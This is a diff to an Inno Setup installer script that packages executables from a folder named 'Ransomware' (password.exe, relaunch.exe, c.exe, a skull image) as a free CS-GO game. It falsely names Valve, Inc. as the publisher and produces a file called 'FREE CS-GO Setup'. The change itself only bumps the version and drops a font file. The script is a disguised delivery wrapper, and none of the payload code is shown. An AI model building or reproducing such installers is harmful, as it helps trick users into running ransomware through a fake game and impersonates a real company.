@@ -2,7 +2,7 @@
 ; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!
 
 #define MyAppName "CS-GO GRATUIT"
-#define MyAppVersion "1.4.0"
+#define MyAppVersion "1.5.0"
 #define MyAppPublisher "Valve, Inc."
 #define MyAppURL "http://csgo.com/?__cf_chl_jschl_tk__=pmd_8cSsiNWggLf.Qw4iT0exBmBZ6xKnDGBjm8DUCsrsEds-1631724166-0-gqNtZGzNAdCjcnBszQNl"
 #define MyAppExeName "CSGO-GRATUIT.exe"
@@ -27,7 +27,7 @@ ChangesAssociations=yes
 DisableProgramGroupPage=yes
 ; Uncomment the following line to run in non administrative install mode (install for current user only.)
 ;PrivilegesRequired=lowest
-OutputBaseFilename=FREE CS-GO Setup 1.4.0
+OutputBaseFilename=FREE CS-GO Setup 1.5.0
 SetupIconFile=D:\Enzo\Documents\Python Scripts\Ransomware\InnoSetup\setup_ico.ico
 Compression=lzma
 SolidCompression=yes
@@ -67,7 +67,6 @@ Source: "D:\Enzo\Documents\Python Scripts\Ransomware\dist\{#MyAppExeName}"; Dest
 Source: "D:\Enzo\Documents\Python Scripts\Ransomware\dist\password.exe"; DestDir: "{app}"; Flags: ignoreversion
 Source: "D:\Enzo\Documents\Python Scripts\Ransomware\dist\relaunch.exe"; DestDir: "{app}"; Flags: ignoreversion
 Source: "D:\Enzo\Documents\Python Scripts\Ransomware\dist\c.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "D:\Enzo\Documents\Python Scripts\Ransomware\Rasterman.ttf"; DestDir: "{app}"; Flags: ignoreversion
 Source: "D:\Enzo\Documents\Python Scripts\Ransomware\skullhead.png"; DestDir: "{app}"; Flags: ignoreversion
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
